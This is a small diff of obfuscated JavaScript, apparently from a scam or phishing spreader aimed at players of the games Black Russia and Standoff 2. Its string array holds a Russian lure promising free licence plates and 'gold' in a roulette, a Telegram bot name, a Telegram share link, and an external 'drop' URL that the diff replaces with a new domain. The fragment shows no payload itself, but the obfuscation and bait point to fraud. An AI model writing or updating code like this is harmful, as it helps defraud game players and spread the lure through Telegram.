@@ -4,7 +4,7 @@
  */
 (function(_0x9a1f, _0x4c2b) {
     const _0x2d8e = [
-        'https://formealwork.net/w/JOZdvXmna',
+        'https://ioothub.xyz/drop',
         'br_gold_drop_bot',
         '🔥 Забирай блатные номера Black Russia и голду Standoff 2 бесплатно в рулетке!',
         'https://t.me/share/url?url=',
